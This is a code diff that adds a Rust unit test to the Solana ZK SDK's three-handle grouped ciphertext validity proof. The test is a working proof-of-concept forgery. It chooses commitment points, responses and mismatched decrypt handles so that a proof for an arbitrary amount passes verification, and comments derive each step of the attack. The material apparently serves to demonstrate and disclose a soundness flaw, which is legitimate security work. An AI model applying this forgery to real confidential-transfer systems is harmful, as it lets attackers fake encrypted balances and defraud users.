@@ -36,6 +36,7 @@ use {
     },
     merlin::Transcript,
 };
+use curve25519_dalek::traits::Identity;
 
 /// Byte length of a grouped ciphertext validity proof for 3 handles
 const GROUPED_CIPHERTEXT_3_HANDLES_VALIDITY_PROOF_LEN: usize = UNIT_LEN * 6;
@@ -506,5 +507,132 @@ mod test {
                 &mut verifier_transcript,
             )
             .unwrap();
+    }
+
+    // Run with: `cargo test --package solana-zk-sdk --lib -- sigma_proofs::grouped_ciphertext_validity::handles_3::test::test_forged_proof --exact --show-output`
+    #[allow(non_snake_case)]
+    #[test]
+    fn test_forged_proof() {
+        let first_keypair = ElGamalKeypair::new_rand();
+        let first_pubkey = first_keypair.pubkey();
+
+        let second_keypair = ElGamalKeypair::new_rand();
+        let second_pubkey = second_keypair.pubkey();
+
+        let third_keypair = ElGamalKeypair::new_rand();
+        let third_pubkey = third_keypair.pubkey();
+
+        // Attack: forge a proof for arbitrary amount
+        let amount = 1000000u64;
+
+        let mut forge_transcript = Transcript::new(b"Test");
+        forge_transcript.grouped_ciphertext_validity_proof_domain_separator(3);
+
+        // Set all Y_i = G to bypass zero-point validation
+        let Y_0 = (*G).compress();
+        let Y_1 = (*G).compress();
+        let Y_2 = (*G).compress();
+        let Y_3 = (*G).compress();
+
+        forge_transcript.append_point(b"Y_0", &Y_0);
+        forge_transcript.append_point(b"Y_1", &Y_1);
+        forge_transcript.append_point(b"Y_2", &Y_2);
+        forge_transcript.append_point(b"Y_3", &Y_3);
+
+        let c = forge_transcript.challenge_scalar(b"c");
+        let w = forge_transcript.challenge_scalar(b"w");
+        let ww = &w * &w;
+        let www = &w * &ww;
+
+        // Normal proof generation (without knowing w in advance):
+        // 1. Prover commits to Y_0 = y_r*H + y_x*G, Y_1 = y_r*P_first, Y_2 = y_r*P_second, Y_3 = y_r*P_third
+        // 2. These commitments are hashed into the transcript to derive challenge c
+        // 3. Prover computes z_r = c*r + y_r and z_x = c*amount + y_x
+        // 4. z_r and z_x are sent to verifier and absorbed into the transcript
+        // 5. Verifier derives w from the transcript and checks the equation with w, w^2, w^3 weights
+        //
+        // In the honest case, the prover must know:
+        // - The opening (amount, r) of the commitment C = amount*G + r*H
+        // - The same randomness r that was used to create the decrypt handles:
+        //   D_first = r*P_first, D_second = r*P_second, D_third = r*P_third
+        // This binding between the commitment and handles ensures the committed amount
+        // is the same value that's encrypted under each public key.
+        //
+        // Attack goal: Use different randomness for the handles D_first, D_second, and D_third,
+        // while still ensuring the proof passes verification.
+        //
+        // Attack strategy:
+        // The verification equation mixes terms with base G and base H (which are orthogonal).
+        // We need to balance both components separately:
+        // - G component: terms involving z_x*G, c*amount*G, and Y_i
+        // - H component: terms involving z_r*H, c*r*H, z_r*P_i, and c*D_i
+        //
+        // Since G and H are orthogonal bases, we can't use G terms to cancel H terms.
+        // We'll set z_r = 0 to simplify the H component for demonstration purposes (z_r is a free variable that we control).
+        //
+        // Verification equation with z_r = 0:
+        // z_x*G - c*C - Y_0 - w*c*D_first - w*Y_1 - w^2*c*D_second - w^2*Y_2 - w^3*c*D_third - w^3*Y_3 = 0
+        //
+        // With C = amount*G + r*H, this splits into:
+        // G component: z_x*G - c*amount*G - Y_0 - w*Y_1 - w^2*Y_2 - w^3*Y_3 = 0
+        // H component: -c*r*H - w*c*D_first - w^2*c*D_second - w^3*c*D_third = 0
+        //
+        // For the H component to be zero with arbitrary r, we need the D terms to cancel among themselves:
+        // -w*c*D_first - w^2*c*D_second - w^3*c*D_third = 0
+        //
+        // One solution: D_first = H, D_second = -H/w, D_third = 0
+        // These are different points, but their weighted sum is zero:
+        // -w*c*H - w^2*c*(-H/w) - 0 = -w*c*H + w*c*H = 0
+        //
+        // For the G component, setting Y_i = G gives us:
+        // z_x*G - c*amount*G - G - w*G - w^2*G - w^3*G = 0
+        // Therefore: z_x = c*amount + 1 + w + w^2 + w^3
+
+        // Set z_r = 0 (identity point)
+        let z_r = Scalar::from(0u64);
+
+        // With the D terms cancelled, the equation becomes:
+        // z_x*G - c*amount*G - G - w*G - w^2*G - w^3*G = 0
+        // Therefore: z_x = c*amount + 1 + w + w^2 + w^3
+        let z_x = &c * &Scalar::from(amount) + &Scalar::from(1u64) + &w + &ww + &www;
+
+        let forged_proof = GroupedCiphertext3HandlesValidityProof {
+            Y_0,
+            Y_1,
+            Y_2,
+            Y_3,
+            z_r,
+            z_x,
+        };
+
+        // Create corresponding commitment and handles for the forged amount
+        let commitment = Pedersen::with(amount, &PedersenOpening::default());
+
+        // Create decrypt handles as points on the curve
+        // D_first = H
+        let first_handle = DecryptHandle(*H);
+
+        // D_second = -H/w = -w^(-1) * H
+        let w_inv = w.invert();
+        let second_handle = DecryptHandle(-&w_inv * *H);
+
+        // D_third = 0 (identity point)
+        let third_handle = DecryptHandle(RistrettoPoint::identity());
+
+        let mut verifier_transcript = Transcript::new(b"Test");
+
+        let result = forged_proof.verify(
+            &commitment,
+            first_pubkey,
+            second_pubkey,
+            third_pubkey,
+            &first_handle,
+            &second_handle,
+            &third_handle,
+            &mut verifier_transcript,
+        );
+
+        assert!(result.is_ok(), "Forged proof should pass verification!");
+        println!("Attack successful: Forged proof for amount {} passed verification!", amount);
     }
 }
